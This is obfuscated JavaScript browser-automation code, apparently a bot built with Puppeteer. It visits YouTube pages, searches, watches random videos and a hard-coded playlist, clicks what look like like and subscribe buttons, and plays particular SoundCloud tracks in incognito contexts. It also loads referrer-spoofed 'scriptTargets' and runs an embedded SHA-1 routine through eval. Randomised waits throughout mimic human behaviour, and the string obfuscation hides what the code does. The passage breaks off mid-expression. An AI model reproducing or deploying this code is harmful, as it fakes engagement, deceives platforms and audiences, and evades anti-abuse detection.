const V = b,
  U = d,
  T = c;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * 0x47c + 0x2ec * -0x6 + -0x581 * -0x4);
    let h = e[f];
    if (b['HPFhtA'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x16e * 0x17 + -0x1c9d + -0x445, s, t, u = -0x119a + 0x65 * 0x2b + -0x1 * -0xa3; t = n['charAt'](u++); ~t && (s = r % (-0x1 * 0x11c1 + -0x1b3c + 0x2d01) ? s * (0x87 * 0x7 + 0xe5 * 0x25 + 0x1 * -0x248a) + t : t, r++ % (0x142f + 0x14f0 + -0x291b)) ? p += String['fromCharCode'](0x128d + 0xa01 + -0x1b8f * 0x1 & s >> (-(0xc * -0x322 + -0x5 * -0x5a1 + 0x975) * r & 0x10e4 + -0xf3c + -0xd1 * 0x2)) : -0x1 * 0x10b1 + -0x2cf * 0x9 + 0x29f8) {
          t = o['indexOf'](t);
        }
        for (let v = 0x14aa + -0x1 * 0x479 + 0x1 * -0x1031, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x13 * -0x1d + -0x11ed + 0x7eb * 0x2))['slice'](-(-0x1 * 0x20c8 + -0x592 + -0x7ac * -0x5));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1809 + 0x3a * -0x31 + -0xcef * 0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x35 * 0x85 + 0x1f68 + -0x3df; u < 0x1ead + 0x1 * -0x2151 + -0x2 * -0x1d2; u++) {
          p[u] = u;
        }
        for (u = -0x199f + 0x267 * -0x8 + 0x373 * 0xd; u < 0x1 * -0x152b + 0x1ff1 + 0x6 * -0x1a1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x10b * -0xd + -0x19ec + 0x137 * 0xb), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xdb7 * 0x2 + 0x20f1 + -0x583 * 0x1, q = 0x13 * 0x13 + -0x1f * -0x77 + -0xfd2;
        for (let v = -0x511 * 0x3 + -0x1234 + 0x2167; v < n['length']; v++) {
          u = (u + (-0x7 * -0x540 + -0x546 + -0x1f79)) % (-0x1f0 * 0x4 + 0x1 * -0xf07 + -0x17c7 * -0x1), q = (q + p[u]) % (0x1 * 0x607 + -0x352 + 0x13 * -0x17), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x302 + 0x11dc + 0x13de * -0x1)]);
        }
        return t;
      };
      b['tqRsZD'] = m, c = arguments, b['HPFhtA'] = !![];
    }
    const j = e[-0x27 * -0xa3 + 0x1adf + 0x1 * -0x33b4],
      k = f + j,
      l = c[k];
    return !l ? (b['kMHvmY'] === undefined && (b['kMHvmY'] = !![]), h = b['tqRsZD'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x171e + 0x2437 + -0x3b54))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1395 + -0x2a2 + 0x10f3 * -0x1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xfe * 0xa + 0x1 * 0xbd7f + 0x923 * -0x9 + (-0x42d + 0xb * -0x3d3 + 0x68d6) * random()) : await standardWaitForNetIdle(f), await wait(-0xee3 + 0x1b65 + 0x3a * 0x1f + (0x1f5b + 0x19e2 + -0x21 * 0x8d) * random()), -0x133c * 0x1 + -0x24fd + 0x383a;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x29 * -0x1e + -0xf8c + -0x2 * -0xf23), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xca5 + 0x5 * 0xab + -0x1 * -0x94f;
}
async function randomWait() {
  return await wait(0xc58 + 0x7b * -0x17 + 0x123d + (-0x592 + 0x978 + -0x8a * -0x1d) * random()), 0x1809 + 0x3a * -0x31 + -0xcee * 0x1;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x35 * 0x85 + 0x1f68 + -0x3df, 0x1ead + 0x1 * -0x2151 + -0x1 * -0x2ab), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x13375 + 0x11bd * -0xd + 0x1017a * 0x3) * getRandomInt(0x1 * -0x152b + 0x1ff1 + 0xd * -0xd4, -0x10b * -0xd + -0x19ec + 0x27a * 0x5), h)), -0xdb7 * 0x2 + 0x20f1 + -0x11a * 0x5;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x13 * 0x13 + -0x1f * -0x77 + -0xfd2;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x511 * 0x3 + -0x1234 + 0x2168]['split']('\x20');
    for (let k = -0x7 * -0x540 + -0x546 + -0x1f7a; k < i['length']; k += -0x1f0 * 0x4 + 0x1 * -0xf07 + -0x16c9 * -0x1)
      j += i[k] * h[i[k + (0x1 * 0x607 + -0x352 + 0x2 * -0x15a)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x302 + 0x11dc + 0x14d8 * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x27 * -0xa3 + 0x1adf + 0x1 * -0x33b3)['map'](l => l['childNodes'][0x383 + -0x5d0 * 0x4 + 0x26 * 0x85]['childNodes'][-0x12 + 0x187a * -0x1 + 0x623 * 0x4]['childNodes'][-0x1809 + -0x10e6 + 0x28f0]['childNodes'][-0x1b25 + -0x109c + 0x1 * 0x2bc1]['childNodes'][-0x5 * 0xc5 + 0x649 * 0x5 + -0x1b93]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x4 * 0x437 + 0xd54 + -0x1a48, -0x1 * -0x16e2 + -0x1aa7 + 0x174d)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x6086 + -0x2 * 0x827 + -0x15a0);
  const h = await getMaxTime(f),
    i = Math['min']((0x3a9 * 0x23 + 0x2 * -0x68f9 + 0x1 * 0x13c37) * getRandomInt(-0x675 * -0x5 + -0xf95 * -0x2 + -0x3f71, 0x8 * -0x304 + 0xbb + -0x6f * -0x36), h);
  return await wait(i), -0x8 * -0x52 + -0xe46 + 0xbb7 * 0x1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x4d * 0x63 + 0x16af + 0x53f * -0xa]['children'][0x5 * -0x383 + 0x2 * -0x43a + 0x1a03]['children'][0x6e * -0x11 + -0x6 * 0x538 + 0x269e]['children'][-0x492 + 0x143d + -0xfab]['children'][-0x1f40 + 0xd4f * 0x1 + 0x11f1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x3 * 0x277 + -0x1 * 0x587 + -0xced * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x4c8 + 0x5f * 0x49 + -0x1f7b + (-0x54 + 0x21b3 + -0x212d) * random()
  }), await wait(0x7c1 * 0x3 + 0x1307 * -0x2 + 0x595 * 0x3 + (-0x25a1 + -0xb * 0x95 + 0x1 * 0x2d34) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x2656 + -0x9 * 0xb7 + -0xeed * -0x3]['childNodes'][0x119a * 0x1 + 0x1 * -0x1855 + 0x6bc]['childNodes'][-0x1 * -0x236d + -0x95 * -0x9 + 0x28a9 * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1396 + -0x2a8 + 0x1 * -0x10e9]['childNodes'][0x2 * 0xcf7 + -0xeaa * -0x1 + -0x2898]['childNodes'][0x3 * -0x2ef + -0x207e + 0x1 * 0x294d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1 * 0xe2f + 0x2152 + 0x2f80 * -0x1),
          r = 0x17 * 0x161 + -0x11c8 + -0xdef;
        for (let u = 0x8c0 + 0x64c * 0x6 + -0x2e88; u < q['length']; u += -0x253a + -0x1de1 * 0x1 + 0x431d)
          r += q[u] * k[q[u + (0x7c5 + -0x1 * 0x1f76 + -0x151 * -0x12)]];
        return r;
      }(n);
  });
  await wait((-0x28 * -0x2ea + -0x4fed + -0x49 * -0x4d) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xae1a + 0x3f37 * -0x2 + 0x216e8) * getRandomInt(0x20f6 * 0x1 + -0xf4 * -0x1a + -0x3 * 0x133f, -0xf2f + -0x1 * -0x21dd + 0x952 * -0x2), h + (-0x1850 + -0xd23 + 0x38fb));
  return await wait(i), -0x1a29 + 0x1c + -0x3a * -0x73;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x17d6 + -0x3ab * -0x7 + -0x3183), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xa1b * -0x1 + -0x7b3 + -0x95 * -0x10 + (-0x31c + -0x26ad + 0x2db1) * Math['random']());
    });
  }, -0xa85 * -0x1 + 0x2728 + 0x1 * -0x1655);
  await wait(0x23d64 * 0x1 + -0x963 * 0x46 + 0x4e78e);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x7 * 0x3b91 + -0x19704 + 0xe06d) * getRandomInt(0x655 + -0x1c12 + 0x15c1, -0x11 * -0x13c + -0x1b7e + 0x1 * 0x69b)), clearInterval(h), -0x1ec6 + -0xe95 * 0x1 + 0x2d5c;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * 0x47c + 0x2ec * -0x6 + -0x581 * -0x4);
    let h = e[f];
    if (c['YwFIUX'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x16e * 0x17 + -0x1c9d + -0x445, r, s, t = -0x119a + 0x65 * 0x2b + -0x1 * -0xa3; s = m['charAt'](t++); ~s && (r = q % (-0x1 * 0x11c1 + -0x1b3c + 0x2d01) ? r * (0x87 * 0x7 + 0xe5 * 0x25 + 0x1 * -0x248a) + s : s, q++ % (0x142f + 0x14f0 + -0x291b)) ? o += String['fromCharCode'](0x128d + 0xa01 + -0x1b8f * 0x1 & r >> (-(0xc * -0x322 + -0x5 * -0x5a1 + 0x975) * q & 0x10e4 + -0xf3c + -0xd1 * 0x2)) : -0x1 * 0x10b1 + -0x2cf * 0x9 + 0x29f8) {
          s = n['indexOf'](s);
        }
        for (let u = 0x14aa + -0x1 * 0x479 + 0x1 * -0x1031, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x13 * -0x1d + -0x11ed + 0x7eb * 0x2))['slice'](-(-0x1 * 0x20c8 + -0x592 + -0x7ac * -0x5));
        }
        return decodeURIComponent(p);
      };
      c['GwPues'] = i, b = arguments, c['YwFIUX'] = !![];
    }
    const j = e[0x1809 + 0x3a * -0x31 + -0xcef * 0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['GwPues'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x14c9 + -0xb3 * -0x1a + 0x29b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x31 * 0x41 + 0xa9 * -0x28 + 0x26da;
    await randomWait();
  }
  return -0x1 * 0x174e + -0x2f * -0x92 + 0x5 * -0xb3;
}

function fetchRandomSC() {
  const R = c;
  return Math['random']() <= 0x1 * -0x1d83 + 0x1db6 + 0x11 * -0x3 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x6c0 + 0x1 * -0xb0d + 0x44d + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : R(0xe) + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1 * 0xbdd + 0x77c + -0x673 * 0x3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1c4 * 0x7 + -0x5 * 0xc3 + -0xb * 0xc7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x124a8 + -0x1 * -0xb7b + -0x9 * 0xe43 + getRandomInt(0xb77 * 0x6 + -0x3333 + 0x3 * 0xdab, -0x5bc * 0x28 + -0x86 * -0x61 + 0x93e5 * 0x2));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1c1 * 0x11 + -0x20c2 + 0x3e94), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x385 * 0x5 + 0x3 * -0x2fb + -0x8a8;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xaa4 + 0x1d58 + 0x7 * -0x2ac, -0x4 * 0x455 + -0x1547 + 0x4d * 0x81)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x200a + 0xa2 * -0x9 + 0x2d8c + floor((0x1fbf + 0xd81 + -0x93 * 0x48) * random()))), log('p2'), log(await s['evaluate'](() => {
        const S = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x9f5369a0 + 0x7999 * -0xba62 + -0x1c9a2679 * -0x2),
          -0xe3fe9 * -0x1 + 0x4cffa7 + 0x24c070,
          -0xd43e + 0x1 * -0xf755 + 0x15d * 0x1af,
          0x1a7b * -0x1 + -0x25e9 + 0x40e4
        ], y = [
          -0x13f7 + -0x1 * -0x121d + -0x3 * -0xa6,
          -0x13eb * 0x1 + 0x1 * -0x9b3 + 0x1dae,
          -0x1a9f + -0x256c * -0x1 + 0x397 * -0x3,
          0x5ba + 0x4fc + -0xab6
        ], z = [
          S(0xa, 'Slk0'),
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1 * -0x2266 + 0x1dee + -0x4053)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x15a2 + -0x21a7 * -0x1 + -0x3749; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x21ec + -0x1e9a + 0x4086) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x25b0 + -0xd9b + -0x5 * 0x4d1] = A[-0xb71 * 0x1 + 0x1d2b + -0x22 * 0x85] = A[-0x427 * -0x9 + -0x6 * 0x5a1 + -0x398] = A[0x352 * -0x4 + 0x1e1 * -0x1 + 0xb * 0x161] = A[0x4 * -0x4e5 + 0x19ae + 0x617 * -0x1] = A[0x1d42 + -0x1b07 + 0x3 * -0xbd] = A[0x364 + -0x1 * 0x2381 + 0x1 * 0x2022] = A[0x15ac + -0x79d * -0x1 + -0x1d43] = A[-0x1006 + -0x88b + 0x1898] = A[0xc24 + 0x24 * -0x23 + -0x5c * 0x14] = A[0xae1 * -0x3 + -0x13f8 + -0xc * -0x463] = A[0x265 * 0x2 + -0x1321 + 0xe61] = A[-0x316 + -0x1634 + -0x1955 * -0x1] = A[-0x1a3 * -0xf + 0x1257 * -0x1 + 0x20e * -0x3] = A[-0x9da + 0xc01 + -0x21a] = A[-0xd81 * 0x1 + -0x1 * -0x937 + 0x458] = A[-0xdc * 0xa + 0x5 * 0x6d6 + 0x1 * -0x1987] = 0x3d7 + 0x4 * -0x602 + -0x6bb * -0x3, this['blocks'] = A) : this['blocks'] = [
                -0xd0 * 0xb + -0x640 + 0xf30,
                -0x1eb * -0x11 + 0x349 + 0x2 * -0x11f2,
                -0x2 * -0xdde + -0x11 * 0x38 + 0x2 * -0xc02,
                0x103 + 0x670 * -0x1 + -0x56d * -0x1,
                0x1882 + 0x2 * 0x80f + 0x410 * -0xa,
                -0x434 + -0x1e4e + 0x4ee * 0x7,
                0xb * -0x269 + 0xb * -0x325 + 0x3d1a,
                0x26d6 + 0x2a9 + 0x1 * -0x297f,
                0x1a03 + 0xd9e + 0x7ed * -0x5,
                -0xb7 + -0xd3 * -0x1d + 0xe * -0x1a8,
                -0x695 * -0x3 + -0x2220 + 0xe61,
                0x5e * -0x4 + -0x4d * -0x33 + -0xddf,
                0x255b + 0xb7c + -0x30d7,
                0x3dd + 0x109d + -0x147a,
                -0x2333 + -0x2538 + 0x486b,
                0x278 + -0x4 * -0x361 + -0xffc,
                0x1eb * 0x5 + -0x21a9 + -0x3 * -0x806
              ], this['h0'] = -0xb14b3554 + 0x9 * -0x116a71c8 + 0x1 * 0x1b54e585d, this['h1'] = -0x1dd * 0x288764 + -0xb * 0xdafd53 + 0x144bad36e, this['h2'] = 0x56f163a7 + -0x2 * 0xa13e007 + -0xc470833 * -0x7, this['h3'] = -0x128 * -0xfc59 + -0x49b4bd0 + -0xd6 * -0x1785cd, this['h4'] = -0xf069b5ee + 0x119506e20 + 0x9aec29be, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2 * -0x43b + 0xda2 + -0x1618, this['finalized'] = this['hashed'] = -0xfa1 + 0x1d24 + 0x1 * -0xd83, this['first'] = 0x12df + -0xfd * -0x18 + -0x2a96;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x223f + -0x23bc + 0x45fb, O = J['length'] || 0x263f + -0xd2e + -0x1911, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1cd0 + 0x95 * -0xd + 0x3 * -0x715, P[0x23e9 + -0xb * 0x52 + -0x1 * 0x2063] = this['block'], P[0x2 * 0x2f + 0x3 * -0x5d3 + -0x36f * -0x5] = P[-0x1 * 0x18fb + 0x1 * 0x8c9 + 0x13f * 0xd] = P[0x1 * -0x210b + 0x69e * -0x1 + 0x27ab] = P[-0xe36 + 0x170a + -0x8d1 * 0x1] = P[-0x1d13 + 0x17 + -0x80 * -0x3a] = P[0x24e9 + 0xb88 + -0x306c] = P[-0x1f * 0x4 + 0x1eb * 0x2 + 0xd5 * -0x4] = P[-0x2b * 0x42 + -0x12a8 + 0x1dc5] = P[0x1 * -0xb04 + 0x1e92 + -0x1386] = P[-0x259a + 0x1 * 0x10b2 + 0x14f1] = P[-0x1 * -0x36d + 0x1fa2 + -0x2305] = P[-0x2306 * -0x1 + -0x1906 + -0x9f5] = P[0x1 * 0x6d1 + 0x1119 + 0x1 * -0x17de] = P[0xe0c * 0x2 + -0x1 * -0x1b5a + -0x3765] = P[-0x247d + -0x278 * 0x4 + 0x2e6b] = P[0x1 * 0x87a + 0x6b0 * 0x2 + 0x31d * -0x7] = -0x30 * 0x78 + 0x2 * 0x53 + 0x15da), K) {
                    for (N = this['start']; M < O && N < 0x151 * -0x4 + 0x163c * -0x1 + 0x1 * 0x1bc0; ++M)
                      P[N >> 0x1d72 + -0x6c4 * -0x1 + -0x2434] |= J[M] << y[-0x21 * -0x83 + 0xd3a + 0x1 * -0x1e1a & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x23dd + -0xd * 0x168 + 0x3665; ++M)
                      (L = J['charCodeAt'](M)) < 0x2496 + 0x4 * -0x85f + -0x29a ? P[N >> 0x1 * -0x1973 + -0x346 + 0x5bf * 0x5] |= L << y[-0x1402 + -0x3 * -0x6ea + -0xb9 * 0x1 & N++] : L < 0x15ac + -0x1 * 0x1ceb + 0xf3f * 0x1 ? (P[N >> 0x1124 + -0x1b85 + 0xa63 * 0x1] |= (0xd48 * 0x1 + -0x2291 + 0x1609 | L >> 0x167 * -0x2 + -0x59 * 0xd + 0x759) << y[0x2 * -0x1003 + 0xac1 + 0x3 * 0x718 & N++], P[N >> -0xa1a + 0x7cf + -0x1f * -0x13] |= (0x2 * 0xf53 + 0x69a + -0x24c0 | 0xc55 + 0x61e + -0x1d2 * 0xa & L) << y[-0x985 + -0x50b * -0x1 + 0x47d & N++]) : L < 0x18f74 + -0x2 * -0x4fb7 + -0x2 * 0xab71 || L >= -0xcc9 * 0x21 + 0x1b7f6 + 0xcdf3 ? (P[N >> 0x3 * -0x5c + 0x1785 + -0x166f] |= (-0x2 * -0x107e + -0x1f9f + -0x7d | L >> 0xa7a + 0x1 * 0x168e + 0x2 * -0x107e) << y[0xc * 0x17e + 0x3b * 0x57 + -0x25f2 & N++], P[N >> 0x121f + 0x9 * 0x41c + -0x193 * 0x23] |= (0x89 * -0xb + 0x159e + -0xf3b | L >> -0x1fa7 + -0x4 * -0x55b + 0xa41 & 0x3 * -0xb53 + -0x147b + 0x1 * 0x36b3) << y[-0x5ac + -0x16b0 + 0x1c5f & N++], P[N >> 0x45 * 0x2d + -0x16 * 0x17b + -0xf * -0x15d] |= (-0x1 * 0x2c9 + -0xef1 + 0x1 * 0x123a | 0x8f9 + -0x2159 + 0x189f & L) << y[0x25eb + 0x1 * 0xf33 + -0x351b * 0x1 & N++]) : (L = -0x2 * 0x7769 + 0xf7 * -0x64 + 0x2 * 0x127a7 + ((-0xd6f * -0x1 + -0x53 * -0x5 + 0x95 * -0x13 & L) << 0x1a05 + -0x1891 + -0x16a | -0x2622 + 0x3a7 + -0x267a * -0x1 & J['charCodeAt'](++M)), P[N >> 0xe * 0x1c9 + 0x2 * -0x714 + -0xad4] |= (-0xef3 * 0x1 + -0x3de + 0x13c1 | L >> 0x20 * -0x59 + -0x3 * 0x50c + -0x1 * -0x1a56) << y[-0xb43 + -0x1a3 * -0x7 + -0x2f * 0x1 & N++], P[N >> -0xb * -0x5d + -0x2 * -0x8db + -0x15b3] |= (0xd82 + -0x1f5d + 0x125b | L >> -0x9 * -0x349 + 0xd85 + -0x2b0a & 0x40 * -0x40 + -0x1436 + -0x99 * -0x3d) << y[0x2320 + -0xa9f + -0x72 * 0x37 & N++], P[N >> -0x20e3 * 0x1 + -0xa47 + 0x2b2c] |= (-0x1 * 0x1931 + -0x25c3 + 0x3f74 | L >> 0x1627 + -0x2 * 0x1288 + 0xeef * 0x1 & -0x250b * 0x1 + 0x1 * 0xaa2 + 0x1aa8) << y[0x1cfc + -0xc * -0x85 + -0x2335 & N++], P[N >> 0x7c9 + 0x1818 + -0x1fdf] |= (0x1b6f * 0x1 + 0x2f * -0x5 + -0x1a04 | 0x1 * -0x123c + -0x134a + 0x25c5 & L) << y[0x24ba + -0x66d * 